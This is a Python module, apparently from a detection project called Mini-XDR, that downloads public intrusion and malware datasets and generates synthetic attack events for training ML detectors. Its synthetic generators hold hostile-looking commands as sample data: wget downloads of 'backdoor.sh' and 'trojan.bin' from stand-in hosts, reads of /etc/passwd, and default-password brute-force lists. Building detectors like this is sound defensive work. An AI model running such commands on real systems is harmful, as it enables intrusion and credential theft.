"""
Training Data Collector for Enhanced Mini-XDR
Downloads and processes open source cybersecurity datasets for ML training
"""
import asyncio
import aiohttp
import aiofiles
import csv
import json
import gzip
import zipfile
import tarfile
import logging
import os
import pandas as pd
import numpy as np
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime, timedelta
from pathlib import Path
import hashlib
import tempfile
from urllib.parse import urlparse

from .ml_engine import prepare_training_data_from_events, EnsembleMLDetector
from .models import Event
from .config import settings

logger = logging.getLogger(__name__)


class TrainingDataCollector:
    """Collector for open source cybersecurity training datasets"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.data_dir = Path("./training_data")
        self.data_dir.mkdir(exist_ok=True, parents=True)
        
        # Dataset registry
        self.datasets = {
            "unsw_nb15": {
                "name": "UNSW-NB15",
                "description": "Network intrusion detection dataset",
                "url": "https://research.unsw.edu.au/projects/unsw-nb15-dataset",
                "download_urls": [
                    "https://cloudstor.aarnet.edu.au/plus/s/2DhnLGDdEECo4ys/download?path=%2FUNSW-NB15%20-%20CSV%20Files&files=UNSW-NB15_1.csv",
                    "https://cloudstor.aarnet.edu.au/plus/s/2DhnLGDdEECo4ys/download?path=%2FUNSW-NB15%20-%20CSV%20Files&files=UNSW-NB15_2.csv",
                    "https://cloudstor.aarnet.edu.au/plus/s/2DhnLGDdEECo4ys/download?path=%2FUNSW-NB15%20-%20CSV%20Files&files=UNSW-NB15_3.csv"
                ],
                "type": "network_intrusion",
                "format": "csv",
                "size_mb": 1200,
                "features": [
                    "srcip", "sport", "dstip", "dsport", "proto", "state", "dur", "sbytes", "dbytes",
                    "sttl", "dttl", "sloss", "dloss", "service", "sload", "dload", "spkts", "dpkts"
                ],
                "target": "label"
            },
            "cic_ids2017": {
                "name": "CIC-IDS2017",
                "description": "Comprehensive intrusion detection dataset",
                "url": "https://www.unb.ca/cic/datasets/ids-2017.html",
                "download_urls": [
                    "https://www.unb.ca/cic/datasets/ids-2017.html"  # Manual download required
                ],
                "type": "network_intrusion",
                "format": "csv",
                "size_mb": 2000,
                "features": [
                    "Flow_Duration", "Total_Fwd_Packets", "Total_Backward_Packets",
                    "Flow_Bytes/s", "Flow_Packets/s", "Flow_IAT_Mean", "Fwd_IAT_Total"
                ],
                "target": "Label"
            },
            "kdd_cup_99": {
                "name": "KDD Cup 99",
                "description": "Classic network intrusion detection dataset",
                "url": "http://kdd.ics.uci.edu/databases/kddcup99/kddcup99.html",
                "download_urls": [
                    "http://kdd.ics.uci.edu/databases/kddcup99/kddcup.data_10_percent.gz",
                    "http://kdd.ics.uci.edu/databases/kddcup99/kddcup.data.gz"
                ],
                "type": "network_intrusion",
                "format": "csv",
                "size_mb": 75,
                "features": [
                    "duration", "protocol_type", "service", "flag", "src_bytes", "dst_bytes",
                    "land", "wrong_fragment", "urgent", "hot", "num_failed_logins"
                ],
                "target": "attack_type"
            },
            "malware_bazaar": {
                "name": "MalwareBazaar",
                "description": "Malware samples and metadata",
                "url": "https://bazaar.abuse.ch/api/",
                "download_urls": [
                    "https://bazaar.abuse.ch/export/csv/recent/"
                ],
                "type": "malware",
                "format": "csv", 
                "size_mb": 50,
                "features": [
                    "sha256_hash", "md5_hash", "sha1_hash", "reporter", "tags",
                    "malware_printable", "malware_alias", "signature", "first_seen"
                ],
                "target": "malware_printable"
            },
            "urlhaus": {
                "name": "URLhaus",
                "description": "Malicious URL database",
                "url": "https://urlhaus.abuse.ch/api/",
                "download_urls": [
                    "https://urlhaus.abuse.ch/downloads/csv_recent/"
                ],
                "type": "url_analysis",
                "format": "csv",
                "size_mb": 20,
                "features": [
                    "id", "dateadded", "url", "url_status", "last_online", "threat",
                    "tags", "urlhaus_link", "reporter"
                ],
                "target": "threat"
            },
            "cowrie_global": {
                "name": "Cowrie Global Dataset", 
                "description": "Global SSH honeypot logs from Cowrie deployments",
                "url": "https://github.com/cowrie/cowrie",
                "download_urls": [
                    # These would be actual Cowrie data sources
                    "https://github.com/cowrie/cowrie/wiki/Sample-Data"
                ],
                "type": "honeypot",
                "format": "json",
                "size_mb": 500,
                "features": [
                    "timestamp", "src_ip", "session", "message", "eventid",
                    "username", "password", "input", "fingerprint"
                ],
                "target": "eventid"
            },
            "abuse_ch_feodo": {
                "name": "Feodo Tracker",
                "description": "Botnet C2 tracker",
                "url": "https://feodotracker.abuse.ch/",
                "download_urls": [
                    "https://feodotracker.abuse.ch/downloads/ipblocklist_recommended.txt"
                ],
                "type": "threat_intel",
                "format": "txt",
                "size_mb": 1,
                "features": ["ip"],
                "target": "malicious"
            },
            "misp_feed": {
                "name": "MISP Feed",
                "description": "Threat intelligence feed",
                "url": "https://www.misp-project.org/feeds/",
                "download_urls": [
                    "https://www.misp-project.org/feeds/"  # Various feeds available
                ],
                "type": "threat_intel",
                "format": "json",
                "size_mb": 100,
                "features": ["indicator", "type", "category", "to_ids"],
                "target": "category"
            }
        }
        
        # Synthetic data generators
        self.synthetic_generators = {
            "ssh_brute_force": self._generate_ssh_brute_force_data,
            "credential_stuffing": self._generate_credential_stuffing_data,
            "lateral_movement": self._generate_lateral_movement_data,
            "malware_download": self._generate_malware_download_data,
            "reconnaissance": self._generate_reconnaissance_data
        }
    
    async def collect_all_datasets(self, datasets: List[str] = None) -> Dict[str, Any]:
        """
        Collect multiple training datasets
        
        Args:
            datasets: List of dataset names to collect (all if None)
            
        Returns:
            Collection results summary
        """
        if datasets is None:
            datasets = list(self.datasets.keys())
        
        results = {
            "collection_timestamp": datetime.utcnow().isoformat(),
            "datasets_requested": datasets,
            "successful_downloads": [],
            "failed_downloads": [],
            "processing_results": {},
            "total_records": 0,
            "total_size_mb": 0
        }
        
        self.logger.info(f"Starting collection of {len(datasets)} datasets")
        
        # Download datasets concurrently
        download_tasks = []
        for dataset_name in datasets:
            if dataset_name in self.datasets:
                task = asyncio.create_task(
                    self._download_dataset(dataset_name),
                    name=f"download_{dataset_name}"
                )
                download_tasks.append(task)
        
        download_results = await asyncio.gather(*download_tasks, return_exceptions=True)
        
        # Process results
        for i, result in enumerate(download_results):
            dataset_name = datasets[i]
            
            if isinstance(result, Exception):
                self.logger.error(f"Dataset {dataset_name} download failed: {result}")
                results["failed_downloads"].append({
                    "dataset": dataset_name,
                    "error": str(result)
                })
            else:
                results["successful_downloads"].append(dataset_name)
                
                # Process downloaded data
                processing_result = await self._process_dataset(dataset_name, result)
                results["processing_results"][dataset_name] = processing_result
                
                if processing_result.get("success"):
                    results["total_records"] += processing_result.get("record_count", 0)
                    results["total_size_mb"] += processing_result.get("size_mb", 0)
        
        # Generate synthetic data
        self.logger.info("Generating synthetic training data")
        synthetic_results = await self._generate_synthetic_data()
        results["synthetic_data"] = synthetic_results
        
        if synthetic_results.get("success"):
            results["total_records"] += synthetic_results.get("record_count", 0)
        
        self.logger.info(f"Dataset collection completed: {results['total_records']} total records")
        
        return results
    
    async def _download_dataset(self, dataset_name: str) -> Dict[str, Any]:
        """Download a specific dataset"""
        
        dataset_info = self.datasets[dataset_name]
        dataset_dir = self.data_dir / dataset_name
        dataset_dir.mkdir(exist_ok=True)
        
        download_result = {
            "dataset": dataset_name,
            "files_downloaded": [],
            "total_size": 0,
            "success": False
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                for i, url in enumerate(dataset_info["download_urls"]):
                    if not url.startswith("http"):
                        # Skip non-downloadable URLs (manual download required)
                        self.logger.warning(f"Manual download required for {dataset_name}: {url}")
                        continue
                    
                    filename = f"{dataset_name}_{i}.{self._get_file_extension(url, dataset_info['format'])}"
                    file_path = dataset_dir / filename
                    
                    self.logger.info(f"Downloading {url} to {file_path}")
                    
                    try:
                        async with session.get(url, timeout=aiohttp.ClientTimeout(total=3600)) as response:
                            if response.status == 200:
                                content = await response.read()
                                
                                # Handle compressed files
                                if url.endswith('.gz'):
                                    content = gzip.decompress(content)
                                    filename = filename.replace('.gz', '')
                                    file_path = dataset_dir / filename
                                
                                async with aiofiles.open(file_path, 'wb') as f:
                                    await f.write(content)
                                
                                file_size = len(content)
                                download_result["files_downloaded"].append({
                                    "filename": filename,
                                    "size": file_size,
                                    "url": url
                                })
                                download_result["total_size"] += file_size
                                
                                self.logger.info(f"Downloaded {filename} ({file_size} bytes)")
                                
                            else:
                                self.logger.error(f"Download failed for {url}: HTTP {response.status}")
                                
                    except asyncio.TimeoutError:
                        self.logger.error(f"Download timeout for {url}")
                    except Exception as e:
                        self.logger.error(f"Download error for {url}: {e}")
            
            download_result["success"] = len(download_result["files_downloaded"]) > 0
            
        except Exception as e:
            self.logger.error(f"Dataset download failed for {dataset_name}: {e}")
            download_result["error"] = str(e)
        
        return download_result
    
    def _get_file_extension(self, url: str, format_type: str) -> str:
        """Get appropriate file extension"""
        
        parsed_url = urlparse(url)
        path = parsed_url.path
        
        if path.endswith('.csv'):
            return 'csv'
        elif path.endswith('.json'):
            return 'json'
        elif path.endswith('.txt'):
            return 'txt'
        elif path.endswith('.gz'):
            return 'csv.gz'  # Assume compressed CSV
        else:
            return format_type
    
    async def _process_dataset(self, dataset_name: str, download_result: Dict[str, Any]) -> Dict[str, Any]:
        """Process a downloaded dataset for ML training"""
        
        dataset_info = self.datasets[dataset_name]
        dataset_dir = self.data_dir / dataset_name
        
        processing_result = {
            "dataset": dataset_name,
            "record_count": 0,
            "processed_files": [],
            "feature_stats": {},
            "success": False
        }
        
        try:
            if not download_result.get("success"):
                return processing_result
            
            for file_info in download_result["files_downloaded"]:
                filename = file_info["filename"]
                file_path = dataset_dir / filename
                
                if not file_path.exists():
                    continue
                
                self.logger.info(f"Processing {filename}")
                
                # Process based on format
                if dataset_info["format"] == "csv":
                    file_result = await self._process_csv_file(file_path, dataset_info)
                elif dataset_info["format"] == "json":
                    file_result = await self._process_json_file(file_path, dataset_info)
                elif dataset_info["format"] == "txt":
                    file_result = await self._process_txt_file(file_path, dataset_info)
                else:
                    self.logger.warning(f"Unsupported format: {dataset_info['format']}")
                    continue
                
                if file_result.get("success"):
                    processing_result["record_count"] += file_result.get("record_count", 0)
                    processing_result["processed_files"].append(file_result)
            
            # Generate feature statistics
            if processing_result["record_count"] > 0:
                processing_result["feature_stats"] = await self._generate_feature_stats(
                    dataset_dir, dataset_info
                )
                processing_result["success"] = True
            
            # Convert to Mini-XDR format
            await self._convert_to_mini_xdr_format(dataset_name, dataset_info, processing_result)
            
        except Exception as e:
            self.logger.error(f"Dataset processing failed for {dataset_name}: {e}")
            processing_result["error"] = str(e)
        
        return processing_result
    
    async def _process_csv_file(self, file_path: Path, dataset_info: Dict[str, Any]) -> Dict[str, Any]:
        """Process a CSV file"""
        
        result = {
            "filename": file_path.name,
            "record_count": 0,
            "columns": [],
            "success": False
        }
        
        try:
            # Read CSV with pandas for better handling
            df = pd.read_csv(file_path, nrows=1000)  # Sample first 1000 rows for stats
            
            result["record_count"] = len(df)
            result["columns"] = list(df.columns)
            result["dtypes"] = df.dtypes.to_dict()
            result["success"] = True
            
            # Save processed subset
            processed_path = file_path.parent / f"processed_{file_path.name}"
            df.to_csv(processed_path, index=False)
            result["processed_path"] = str(processed_path)
            
        except Exception as e:
            self.logger.error(f"CSV processing failed for {file_path}: {e}")
            result["error"] = str(e)
        
        return result
    
    async def _process_json_file(self, file_path: Path, dataset_info: Dict[str, Any]) -> Dict[str, Any]:
        """Process a JSON file"""
        
        result = {
            "filename": file_path.name,
            "record_count": 0,
            "keys": [],
            "success": False
        }
        
        try:
            with open(file_path, 'r') as f:
                # Handle both line-delimited JSON and JSON array
                first_line = f.readline().strip()
                f.seek(0)
                
                if first_line.startswith('['):
                    # JSON array
                    data = json.load(f)
                    if isinstance(data, list):
                        result["record_count"] = len(data)
                        if data:
                            result["keys"] = list(data[0].keys()) if isinstance(data[0], dict) else []
                else:
                    # Line-delimited JSON
                    records = []
                    for line_num, line in enumerate(f):
                        if line_num >= 1000:  # Limit sample size
                            break
                        try:
                            record = json.loads(line.strip())
                            records.append(record)
                        except json.JSONDecodeError:
                            continue
                    
                    result["record_count"] = len(records)
                    if records:
                        result["keys"] = list(records[0].keys()) if isinstance(records[0], dict) else []
                    
                    # Save processed subset
                    processed_path = file_path.parent / f"processed_{file_path.name}"
                    with open(processed_path, 'w') as pf:
                        json.dump(records, pf, indent=2)
                    result["processed_path"] = str(processed_path)
            
            result["success"] = True
            
        except Exception as e:
            self.logger.error(f"JSON processing failed for {file_path}: {e}")
            result["error"] = str(e)
        
        return result
    
    async def _process_txt_file(self, file_path: Path, dataset_info: Dict[str, Any]) -> Dict[str, Any]:
        """Process a text file"""
        
        result = {
            "filename": file_path.name,
            "record_count": 0,
            "success": False
        }
        
        try:
            with open(file_path, 'r') as f:
                lines = []
                for line_num, line in enumerate(f):
                    if line_num >= 10000:  # Limit sample size
                        break
                    line = line.strip()
                    if line and not line.startswith('#'):  # Skip empty lines and comments
                        lines.append(line)
                
                result["record_count"] = len(lines)
                
                # Save processed subset
                processed_path = file_path.parent / f"processed_{file_path.name}"
                with open(processed_path, 'w') as pf:
                    pf.write('\n'.join(lines))
                result["processed_path"] = str(processed_path)
            
            result["success"] = True
            
        except Exception as e:
            self.logger.error(f"Text processing failed for {file_path}: {e}")
            result["error"] = str(e)
        
        return result
    
    async def _generate_feature_stats(self, dataset_dir: Path, dataset_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate feature statistics for a dataset"""
        
        stats = {
            "feature_count": len(dataset_info.get("features", [])),
            "target_variable": dataset_info.get("target"),
            "data_type": dataset_info.get("type"),
            "estimated_size_mb": dataset_info.get("size_mb", 0)
        }
        
        return stats
    
    async def _convert_to_mini_xdr_format(
        self, 
        dataset_name: str, 
        dataset_info: Dict[str, Any], 
        processing_result: Dict[str, Any]
    ):
        """Convert dataset to Mini-XDR Event format for training"""
        
        try:
            converted_events = []
            dataset_dir = self.data_dir / dataset_name
            
            # Convert based on dataset type
            if dataset_info["type"] == "network_intrusion":
                converted_events = await self._convert_network_intrusion_data(dataset_dir, dataset_info)
            elif dataset_info["type"] == "honeypot":
                converted_events = await self._convert_honeypot_data(dataset_dir, dataset_info)
            elif dataset_info["type"] == "malware":
                converted_events = await self._convert_malware_data(dataset_dir, dataset_info)
            elif dataset_info["type"] == "threat_intel":
                converted_events = await self._convert_threat_intel_data(dataset_dir, dataset_info)
            
            if converted_events:
                # Save converted data
                converted_path = dataset_dir / "mini_xdr_format.json"
                with open(converted_path, 'w') as f:
                    json.dump(converted_events, f, indent=2, default=str)
                
                processing_result["mini_xdr_events"] = len(converted_events)
                processing_result["converted_path"] = str(converted_path)
                
                self.logger.info(f"Converted {len(converted_events)} events to Mini-XDR format for {dataset_name}")
        
        except Exception as e:
            self.logger.error(f"Format conversion failed for {dataset_name}: {e}")
    
    async def _convert_network_intrusion_data(self, dataset_dir: Path, dataset_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Convert network intrusion data to Mini-XDR Event format"""
        
        events = []
        
        try:
            for csv_file in dataset_dir.glob("processed_*.csv"):
                df = pd.read_csv(csv_file)
                
                for _, row in df.iterrows():
                    # Map to Event-like structure
                    event = {
                        "timestamp": datetime.utcnow().isoformat(),
                        "src_ip": row.get("srcip", row.get("Source IP", "unknown")),
                        "dst_ip": row.get("dstip", row.get("Destination IP", "unknown")),
                        "dst_port": int(row.get("dsport", row.get("Destination Port", 0))) if pd.notna(row.get("dsport", row.get("Destination Port", 0))) else None,
                        "eventid": "network.intrusion",
                        "message": f"Network intrusion detection: {row.get(dataset_info.get('target', 'label'), 'unknown')}",
                        "raw": {
                            "dataset": dataset_info["name"],
                            "original_features": row.to_dict(),
                            "attack_type": row.get(dataset_info.get("target", "label"), "unknown")
                        },
                        "source_type": "training_data",
                        "anomaly_score": 1.0 if str(row.get(dataset_info.get("target", "label"), "")).lower() != "normal" else 0.0
                    }
                    events.append(event)
                    
                    if len(events) >= 5000:  # Limit conversion size
                        break
                
                if len(events) >= 5000:
                    break
        
        except Exception as e:
            self.logger.error(f"Network intrusion conversion failed: {e}")
        
        return events
    
    async def _convert_honeypot_data(self, dataset_dir: Path, dataset_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Convert honeypot data to Mini-XDR Event format"""
        
        events = []
        
        try:
            for json_file in dataset_dir.glob("processed_*.json"):
                with open(json_file, 'r') as f:
                    data = json.load(f)
                
                if isinstance(data, list):
                    for record in data:
                        if isinstance(record, dict):
                            event = {
                                "timestamp": record.get("timestamp", datetime.utcnow().isoformat()),
                                "src_ip": record.get("src_ip", "unknown"),
                                "dst_ip": record.get("dst_ip", "127.0.0.1"),
                                "dst_port": record.get("dst_port", 22),
                                "eventid": record.get("eventid", "cowrie.session.connect"),
                                "message": record.get("message", ""),
                                "raw": record,
                                "source_type": "honeypot_training",
                                "anomaly_score": 0.8  # Honeypot data is generally suspicious
                            }
                            events.append(event)
                            
                            if len(events) >= 5000:
                                break
                
                if len(events) >= 5000:
                    break
        
        except Exception as e:
            self.logger.error(f"Honeypot conversion failed: {e}")
        
        return events
    
    async def _convert_malware_data(self, dataset_dir: Path, dataset_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Convert malware data to threat intelligence format"""
        
        events = []
        
        try:
            for csv_file in dataset_dir.glob("processed_*.csv"):
                df = pd.read_csv(csv_file)
                
                for _, row in df.iterrows():
                    event = {
                        "timestamp": row.get("first_seen", datetime.utcnow().isoformat()),
                        "src_ip": "unknown",
                        "dst_ip": "unknown",
                        "dst_port": None,
                        "eventid": "malware.detection",
                        "message": f"Malware detected: {row.get('malware_printable', 'unknown')}",
                        "raw": {
                            "dataset": dataset_info["name"],
                            "hash_sha256": row.get("sha256_hash", ""),
                            "hash_md5": row.get("md5_hash", ""),
                            "malware_family": row.get("malware_printable", ""),
                            "tags": row.get("tags", ""),
                            "signature": row.get("signature", "")
                        },
                        "source_type": "malware_intel",
                        "anomaly_score": 1.0  # Malware is always anomalous
                    }
                    events.append(event)
                    
                    if len(events) >= 1000:  # Smaller limit for malware data
                        break
                
                if len(events) >= 1000:
                    break
        
        except Exception as e:
            self.logger.error(f"Malware conversion failed: {e}")
        
        return events
    
    async def _convert_threat_intel_data(self, dataset_dir: Path, dataset_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Convert threat intelligence data to Mini-XDR format"""
        
        events = []
        
        try:
            for txt_file in dataset_dir.glob("processed_*.txt"):
                with open(txt_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            # Assume each line is an IP address or indicator
                            event = {
                                "timestamp": datetime.utcnow().isoformat(),
                                "src_ip": line if self._is_valid_ip(line) else "unknown",
                                "dst_ip": "unknown",
                                "dst_port": None,
                                "eventid": "threat_intel.indicator",
                                "message": f"Threat intelligence indicator: {line}",
                                "raw": {
                                    "dataset": dataset_info["name"],
                                    "indicator": line,
                                    "indicator_type": "ip" if self._is_valid_ip(line) else "other"
                                },
                                "source_type": "threat_intel",
                                "anomaly_score": 0.9  # Threat intel indicators are highly suspicious
                            }
                            events.append(event)
                            
                            if len(events) >= 2000:
                                break
                
                if len(events) >= 2000:
                    break
        
        except Exception as e:
            self.logger.error(f"Threat intel conversion failed: {e}")
        
        return events
    
    def _is_valid_ip(self, ip_str: str) -> bool:
        """Check if string is a valid IP address"""
        try:
            import ipaddress
            ipaddress.ip_address(ip_str)
            return True
        except ValueError:
            return False
    
    async def _generate_synthetic_data(self) -> Dict[str, Any]:
        """Generate synthetic training data for various attack scenarios"""
        
        synthetic_result = {
            "generated_scenarios": [],
            "record_count": 0,
            "success": False
        }
        
        try:
            all_synthetic_events = []
            
            # Generate different attack scenarios
            for scenario_name, generator_func in self.synthetic_generators.items():
                self.logger.info(f"Generating synthetic data for {scenario_name}")
                
                try:
                    events = await generator_func()
                    all_synthetic_events.extend(events)
                    
                    synthetic_result["generated_scenarios"].append({
                        "scenario": scenario_name,
                        "event_count": len(events),
                        "success": True
                    })
                    
                except Exception as e:
                    self.logger.error(f"Synthetic generation failed for {scenario_name}: {e}")
                    synthetic_result["generated_scenarios"].append({
                        "scenario": scenario_name,
                        "event_count": 0,
                        "success": False,
                        "error": str(e)
                    })
            
            # Save synthetic data
            if all_synthetic_events:
                synthetic_dir = self.data_dir / "synthetic"
                synthetic_dir.mkdir(exist_ok=True)
                
                synthetic_path = synthetic_dir / "synthetic_events.json"
                with open(synthetic_path, 'w') as f:
                    json.dump(all_synthetic_events, f, indent=2, default=str)
                
                synthetic_result["record_count"] = len(all_synthetic_events)
                synthetic_result["output_path"] = str(synthetic_path)
                synthetic_result["success"] = True
                
                self.logger.info(f"Generated {len(all_synthetic_events)} synthetic events")
        
        except Exception as e:
            self.logger.error(f"Synthetic data generation failed: {e}")
            synthetic_result["error"] = str(e)
        
        return synthetic_result
    
    async def _generate_ssh_brute_force_data(self) -> List[Dict[str, Any]]:
        """Generate synthetic SSH brute force attack data"""
        
        events = []
        base_time = datetime.utcnow()
        
        # Common attack IPs (using RFC 5737 test ranges)
        attack_ips = ["192.0.2.10", "192.0.2.20", "192.0.2.30", "198.51.100.10", "203.0.113.5"]
        
        # Common username/password combinations
        usernames = ["root", "admin", "user", "test", "guest", "oracle", "postgres", "mysql"]
        passwords = ["123456", "password", "admin", "root", "123123", "qwerty", "abc123", "password123"]
        
        for attack_ip in attack_ips:
            # Generate failed login attempts
            for i in range(50):  # 50 failed attempts per IP
                event_time = base_time + timedelta(seconds=i * 2)  # 2 seconds apart
                
                event = {
                    "timestamp": event_time.isoformat(),
                    "src_ip": attack_ip,
                    "dst_ip": "192.168.1.100",  # Honeypot IP
                    "dst_port": 22,
                    "eventid": "cowrie.login.failed",
                    "message": f"Failed login attempt from {attack_ip}",
                    "raw": {
                        "username": np.random.choice(usernames),
                        "password": np.random.choice(passwords),
                        "protocol": "ssh",
                        "session": f"session_{attack_ip}_{i}",
                        "synthetic": True
                    },
                    "source_type": "synthetic",
                    "anomaly_score": 0.8
                }
                events.append(event)
            
            # Generate one successful login
            success_event = {
                "timestamp": (base_time + timedelta(seconds=102)).isoformat(),
                "src_ip": attack_ip,
                "dst_ip": "192.168.1.100",
                "dst_port": 22,
                "eventid": "cowrie.login.success",
                "message": f"Successful login from {attack_ip}",
                "raw": {
                    "username": "root",
                    "password": "123456",
                    "protocol": "ssh",
                    "session": f"session_{attack_ip}_success",
                    "synthetic": True
                },
                "source_type": "synthetic",
                "anomaly_score": 1.0
            }
            events.append(success_event)
        
        return events
    
    async def _generate_credential_stuffing_data(self) -> List[Dict[str, Any]]:
        """Generate synthetic credential stuffing attack data"""
        
        events = []
        base_time = datetime.utcnow()
        
        # Distributed attack from multiple IPs
        attack_ips = [f"10.0.{i}.{j}" for i in range(1, 5) for j in range(1, 10)]
        
        # Large variety of credentials (typical of credential stuffing)
        usernames = [f"user{i}" for i in range(1, 100)]
        passwords = [f"pass{i}" for i in range(1, 100)]
        
        for i, attack_ip in enumerate(attack_ips[:20]):  # Limit to 20 IPs
            # Each IP tries many different credentials
            for j in range(25):  # 25 attempts per IP
                event_time = base_time + timedelta(seconds=i * 30 + j)
                
                event = {
                    "timestamp": event_time.isoformat(),
                    "src_ip": attack_ip,
                    "dst_ip": "192.168.1.100",
                    "dst_port": 22,
                    "eventid": "cowrie.login.failed",
                    "message": f"Credential stuffing attempt from {attack_ip}",
                    "raw": {
                        "username": np.random.choice(usernames),
                        "password": np.random.choice(passwords),
                        "protocol": "ssh",
                        "session": f"stuffing_{attack_ip}_{j}",
                        "synthetic": True
                    },
                    "source_type": "synthetic",
                    "anomaly_score": 0.7
                }
                events.append(event)
        
        return events
    
    async def _generate_lateral_movement_data(self) -> List[Dict[str, Any]]:
        """Generate synthetic lateral movement attack data"""
        
        events = []
        base_time = datetime.utcnow()
        
        # Attacker IP that moves laterally
        attacker_ip = "203.0.113.50"
        internal_targets = ["192.168.1.10", "192.168.1.20", "192.168.1.30"]
        
        # Initial compromise
        for i, target in enumerate(internal_targets):
            # Multiple port scanning
            ports = [22, 23, 80, 443, 3389, 5432, 3306]
            
            for port in ports:
                event_time = base_time + timedelta(seconds=i * 60 + port)
                
                event = {
                    "timestamp": event_time.isoformat(),
                    "src_ip": attacker_ip,
                    "dst_ip": target,
                    "dst_port": port,
                    "eventid": "cowrie.session.connect",
                    "message": f"Connection attempt to {target}:{port}",
                    "raw": {
                        "target_host": target,
                        "target_port": port,
                        "scan_type": "lateral_movement",
                        "synthetic": True
                    },
                    "source_type": "synthetic",
                    "anomaly_score": 0.6
                }
                events.append(event)
        
        return events
    
    async def _generate_malware_download_data(self) -> List[Dict[str, Any]]:
        """Generate synthetic malware download data"""
        
        events = []
        base_time = datetime.utcnow()
        
        malware_urls = [
            "http://malicious-site.example/malware.exe",
            "http://bad-domain.example/trojan.bin",
            "http://evil-server.example/backdoor.sh"
        ]
        
        attack_ips = ["198.51.100.50", "198.51.100.60"]
        
        for attack_ip in attack_ips:
            for i, url in enumerate(malware_urls):
                # Download command
                download_time = base_time + timedelta(minutes=i * 5)
                
                command_event = {
                    "timestamp": download_time.isoformat(),
                    "src_ip": attack_ip,
                    "dst_ip": "192.168.1.100",
                    "dst_port": 22,
                    "eventid": "cowrie.command.input",
                    "message": f"Malware download command from {attack_ip}",
                    "raw": {
                        "input": f"wget {url}",
                        "command": "wget",
                        "args": [url],
                        "synthetic": True
                    },
                    "source_type": "synthetic",
                    "anomaly_score": 0.9
                }
                events.append(command_event)
                
                # File download event
                download_event = {
                    "timestamp": (download_time + timedelta(seconds=30)).isoformat(),
                    "src_ip": attack_ip,
                    "dst_ip": "192.168.1.100",
                    "dst_port": 22,
                    "eventid": "cowrie.session.file_download",
                    "message": f"File downloaded from {url}",
                    "raw": {
                        "url": url,
                        "outfile": url.split('/')[-1],
                        "shasum": hashlib.sha256(url.encode()).hexdigest(),
                        "synthetic": True
                    },
                    "source_type": "synthetic",
                    "anomaly_score": 1.0
                }
                events.append(download_event)
        
        return events
    
    async def _generate_reconnaissance_data(self) -> List[Dict[str, Any]]:
        """Generate synthetic reconnaissance attack data"""
        
        events = []
        base_time = datetime.utcnow()
        
        scanner_ips = ["192.0.2.100", "192.0.2.200"]
        
        # Reconnaissance commands
        recon_commands = [
            "whoami", "id", "uname -a", "ps aux", "netstat -an", 
            "cat /etc/passwd", "ls -la", "pwd", "df -h", "mount"
        ]
        
        for scanner_ip in scanner_ips:
            for i, command in enumerate(recon_commands):
                event_time = base_time + timedelta(seconds=i * 10)
                
                event = {
                    "timestamp": event_time.isoformat(),
                    "src_ip": scanner_ip,
                    "dst_ip": "192.168.1.100",
                    "dst_port": 22,
                    "eventid": "cowrie.command.input",
                    "message": f"Reconnaissance command from {scanner_ip}",
                    "raw": {
                        "input": command,
                        "command": command.split()[0],
                        "args": command.split()[1:],
                        "recon_type": "system_enumeration",
                        "synthetic": True
                    },
                    "source_type": "synthetic",
                    "anomaly_score": 0.7
                }
                events.append(event)
        
        return events
    
    async def integrate_with_ml_training(self, dataset_results: Dict[str, Any]) -> Dict[str, Any]:
        """
        Integrate collected training data with ML models
        
        Args:
            dataset_results: Results from collect_all_datasets
            
        Returns:
            Integration results
        """
        integration_result = {
            "training_started": datetime.utcnow().isoformat(),
            "datasets_integrated": [],
            "model_training_results": {},
            "success": False
        }
        
        try:
            # Collect all converted events
            all_training_events = []
            
            # Load from processed datasets
            for dataset_name in dataset_results.get("successful_downloads", []):
                dataset_dir = self.data_dir / dataset_name
                converted_file = dataset_dir / "mini_xdr_format.json"
                
                if converted_file.exists():
                    with open(converted_file, 'r') as f:
                        events = json.load(f)
                        all_training_events.extend(events)
                        integration_result["datasets_integrated"].append(dataset_name)
            
            # Load synthetic data
            synthetic_file = self.data_dir / "synthetic" / "synthetic_events.json"
            if synthetic_file.exists():
                with open(synthetic_file, 'r') as f:
                    synthetic_events = json.load(f)
                    all_training_events.extend(synthetic_events)
                    integration_result["datasets_integrated"].append("synthetic")
            
            if not all_training_events:
                integration_result["error"] = "No training events available"
                return integration_result
            
            self.logger.info(f"Preparing to train ML models with {len(all_training_events)} events")
            
            # Convert to Event objects for ML training
            mock_events = []
            for event_data in all_training_events:
                # Create mock Event object
                mock_event = type('Event', (), {
                    'id': event_data.get('id', 1),
                    'ts': datetime.fromisoformat(event_data['timestamp']),
                    'src_ip': event_data['src_ip'],
                    'dst_ip': event_data.get('dst_ip'),
                    'dst_port': event_data.get('dst_port'),
                    'eventid': event_data['eventid'],
                    'message': event_data.get('message'),
                    'raw': event_data.get('raw', {}),
                    'source_type': event_data.get('source_type', 'training'),
                    'anomaly_score': event_data.get('anomaly_score', 0.0)
                })()
                mock_events.append(mock_event)
            
            # Prepare training data
            training_data = await prepare_training_data_from_events(mock_events)
            
            if training_data:
                # Initialize ML detector and train models
                ml_detector = EnsembleMLDetector()
                
                # Train ensemble models
                training_results = await ml_detector.train_models(training_data)
                integration_result["model_training_results"] = training_results
                
                # Save training metadata
                training_metadata = {
                    "training_timestamp": datetime.utcnow().isoformat(),
                    "training_data_size": len(training_data),
                    "source_events": len(all_training_events),
                    "datasets_used": integration_result["datasets_integrated"],
                    "model_results": training_results
                }
                
                metadata_path = self.data_dir / "training_metadata.json"
                with open(metadata_path, 'w') as f:
                    json.dump(training_metadata, f, indent=2, default=str)
                
                integration_result["training_metadata_path"] = str(metadata_path)
                integration_result["success"] = any(training_results.values())
                
                if integration_result["success"]:
                    self.logger.info("ML model training completed successfully")
                else:
                    self.logger.warning("ML model training failed for all models")
            else:
                integration_result["error"] = "Failed to prepare training data"
        
        except Exception as e:
            self.logger.error(f"ML integration failed: {e}")
            integration_result["error"] = str(e)
        
        return integration_result
    
    async def get_collection_status(self) -> Dict[str, Any]:
        """Get status of data collection and training"""
        
        status = {
            "timestamp": datetime.utcnow().isoformat(),
            "data_directory": str(self.data_dir),
            "available_datasets": list(self.datasets.keys()),
